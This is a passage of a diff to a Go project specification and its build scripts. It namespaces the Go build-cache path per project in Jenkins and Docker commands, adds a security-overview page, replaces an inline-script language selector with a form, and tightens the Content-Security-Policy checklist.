+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=freebsd \
@@ -42159,7 +42266,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=linux \
@@ -42177,7 +42284,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=linux \
@@ -42195,7 +42302,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=darwin \
@@ -42213,7 +42320,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=darwin \
@@ -42231,7 +42338,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=windows \
@@ -42249,7 +42356,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=windows \
@@ -42267,7 +42374,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=freebsd \
@@ -42285,7 +42392,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=freebsd \
@@ -42312,7 +42419,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=linux \
@@ -42330,7 +42437,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=linux \
@@ -42348,7 +42455,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=darwin \
@@ -42366,7 +42473,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=darwin \
@@ -42384,7 +42491,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=windows \
@@ -42402,7 +42509,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=windows \
@@ -42420,7 +42527,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=freebsd \
@@ -42438,7 +42545,7 @@ pipeline {
                                 --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                                 -v ${WORKSPACE}:/app \
                                 -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                                -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                                -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                                 -w /app \
                                 -e CGO_ENABLED=0 \
                                 -e GOOS=freebsd \
@@ -42459,7 +42566,7 @@ pipeline {
                         --name "${PROJECT_NAME}-$(tr -dc 'a-z0-9' </dev/urandom | head -c8)" \
                         -v ${WORKSPACE}:/app \
                         -v ${GO_CACHE:-$HOME/go/pkg/mod}:/usr/local/share/go/pkg/mod \
-                        -v ${GO_BUILD:-$HOME/.cache/go-build}:/usr/local/share/go/cache \
+                        -v ${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}:/usr/local/share/go/cache \
                         -w /app \
                         casjaysdev/go:latest \
                         go test -v -cover ./...
@@ -43662,7 +43769,7 @@ trap "rm -rf $BUILD_DIR" EXIT
 # Go cache directories (same as Makefile)
 # Go cache bind-mounted from host: GO_CACHE (mod) and GO_BUILD (build cache)
 GO_CACHE="${GO_CACHE:-$HOME/go/pkg/mod}"
-GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build}"
+GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}"
 mkdir -p "$GO_CACHE" "$GO_BUILD"
 
 # Common docker run for Go builds
@@ -43912,7 +44019,7 @@ trap "rm -rf $BUILD_DIR; incus delete $CONTAINER_NAME --force 2>/dev/null || tru
 # Go cache directories (same as Makefile)
 # Go cache bind-mounted from host: GO_CACHE (mod) and GO_BUILD (build cache)
 GO_CACHE="${GO_CACHE:-$HOME/go/pkg/mod}"
-GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build}"
+GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}"
 mkdir -p "$GO_CACHE" "$GO_BUILD"
 
 # Common docker run for Go builds
@@ -44411,7 +44518,7 @@ PROJECT_PATH="/root/Projects/github/apimgr/{project_name}"
 # Go cache directories (same as Makefile - speeds up builds significantly)
 # Go cache bind-mounted from host: GO_CACHE (mod) and GO_BUILD (build cache)
 GO_CACHE="${GO_CACHE:-$HOME/go/pkg/mod}"
-GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build}"
+GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}"
 mkdir -p "$GO_CACHE" "$GO_BUILD"
 
 # Common docker run for Go commands
@@ -44462,7 +44569,7 @@ docker run --rm \
 # Go cache directories (same as Makefile)
 # Go cache bind-mounted from host: GO_CACHE (mod) and GO_BUILD (build cache)
 GO_CACHE="${GO_CACHE:-$HOME/go/pkg/mod}"
-GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build}"
+GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}"
 mkdir -p "$GO_CACHE" "$GO_BUILD"
 
 # Build (with caching)
@@ -44494,7 +44601,7 @@ incus delete test-{project_name} --force
 # Go cache directories (same as Makefile)
 # Go cache bind-mounted from host: GO_CACHE (mod) and GO_BUILD (build cache)
 GO_CACHE="${GO_CACHE:-$HOME/go/pkg/mod}"
-GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build}"
+GO_BUILD="${GO_BUILD:-$HOME/.cache/go-build/${PROJECT_NAME}}"
 mkdir -p "$GO_CACHE" "$GO_BUILD"
 
 # Create prefixed temp dir for test data
@@ -45414,6 +45521,7 @@ Programmatic access via `/api/{api_version}/server/{admin_path}/` with bearer to
 - `/.well-known/security.txt`
 - `/.well-known/pgp-key.asc` (when enabled)
 - `/.well-known/change-password`
+- `/server/security`
 - `/server/healthz`
 - `/api/{api_version}/server/healthz`
 
@@ -45421,6 +45529,7 @@ Programmatic access via `/api/{api_version}/server/{admin_path}/` with bearer to
 
 - Explain how researchers use `/.well-known/security.txt`
 - Explain `/server/contact?security_id=...`
+- Link to `/server/security` (human-readable overview of security.txt + how to report)
 - Link to `/server/security/policy`
 
 ## Well-Known Namespace
@@ -45648,11 +45757,23 @@ func LanguageMiddleware(next http.Handler) http.Handler {
 **Language selector UI (in header/footer):**
 
 ```html
-<select onchange="window.location.search='?lang='+this.value" aria-label="{{t .Lang `common.select_language`}}">
-  {{range .AvailableLanguages}}
-    <option value="{{.Code}}" {{if eq .Code $.Lang}}selected{{end}}>{{.NativeName}}</option>
-  {{end}}
-</select>
+<!-- GET form - works without JS; the middleware reads ?lang= and sets the cookie -->
+<form method="get" class="lang-select">
+  <select name="lang" aria-label="{{t .Lang `common.select_language`}}">
+    {{range .AvailableLanguages}}
+      <option value="{{.Code}}" {{if eq .Code $.Lang}}selected{{end}}>{{.NativeName}}</option>
+    {{end}}
+  </select>
+  <button type="submit">{{t .Lang `common.submit`}}</button>
+</form>
+```
+
+```javascript
+// Enhancement in static/js/app.js: auto-submit on change, hide the Go button
+document.querySelectorAll('.lang-select select').forEach((sel) => {
+  sel.closest('form').querySelector('button').hidden = true;
+  sel.addEventListener('change', () => sel.form.submit());
+});
 ```
 
 **Shareable links:** Users can share `https://example.com/page?lang=fr` to force French for the recipient. After the first visit, the cookie persists and `?lang=` is no longer needed.
@@ -56209,6 +56330,7 @@ PATCH /api/{api_version}/users/settings
 | `/api/autodiscover` | GET | None | Public client/agent auto-config |
 | `/api/{api_version}/server/healthz` | GET | None | Public JSON health |
 | `/api/{api_version}/server/reports/*` | POST | None | Public reports sink (CSP, NEL, deprecation, intervention, crash, error, default). See PART 14 → "Public Reports Scope". Browsers cannot present credentials when emitting these reports. Rate-limited per-IP. |
+| `/server/security` | GET | None | Security overview page (HTML) — human-readable security.txt + reporting instructions. See PART 11 → "Security Reports". |
 | `/server/security/policy` | GET | None | Disclosure policy page (HTML). See PART 11 → "Security Reports". |
 | `/server/security/thanks` | GET | None | Acknowledgments / hall-of-fame (HTML). See PART 11. |
 | `/server/security/report/{tracking_id}` | GET | One-shot tracking token (in URL) | Researcher status page. Token is single-use-per-day, expires 30 days after report closes. See PART 11. |
@@ -60165,7 +60287,7 @@ maintainer_email: jane@example.com
 **Go Cache (Host Bind-Mounts):**
 ```bash
 # Go cache bind-mounted from host: GO_CACHE (mod) and GO_BUILD (build cache)
-# Defaults: GO_CACHE=$HOME/go/pkg/mod, GO_BUILD=$HOME/.cache/go-build
+# Defaults: GO_CACHE=$HOME/go/pkg/mod, GO_BUILD=$HOME/.cache/go-build/${PROJECT_NAME}
 # Mount in Docker: -v $GO_CACHE:/usr/local/share/go/pkg/mod -v $GO_BUILD:/usr/local/share/go/cache
 ```
 
@@ -60413,7 +60535,7 @@ make docker
 - [ ] Theme system: light, dark, auto
 - [ ] Dark theme is DEFAULT
 - [ ] Theme toggle in UI
-- [ ] Theme persisted in localStorage
+- [ ] Theme persisted in `theme` cookie (guests) or per-user DB preference - server renders the theme class
 - [ ] NO inline CSS - external stylesheets only
 - [ ] NO JavaScript alerts - toast notifications
 - [ ] Mobile-first responsive design
@@ -60714,7 +60836,7 @@ make docker
 
 ### Security Headers
 
-- [ ] Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
+- [ ] Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
 - [ ] X-Frame-Options: SAMEORIGIN
 - [ ] X-Content-Type-Options: nosniff
 - [ ] X-XSS-Protection: 1; mode=block
@@ -61064,8 +61186,8 @@ make docker
 
 - [ ] Dark theme is DEFAULT
 - [ ] Light theme available
-- [ ] Auto theme (system preference)
-- [ ] Theme persisted in localStorage
+- [ ] Auto theme (system preference via CSS `prefers-color-scheme`)
+- [ ] Theme persisted in `theme` cookie (guests) or per-user DB preference - server renders the theme class
 - [ ] Theme toggle in UI
 - [ ] Same theme system everywhere
 
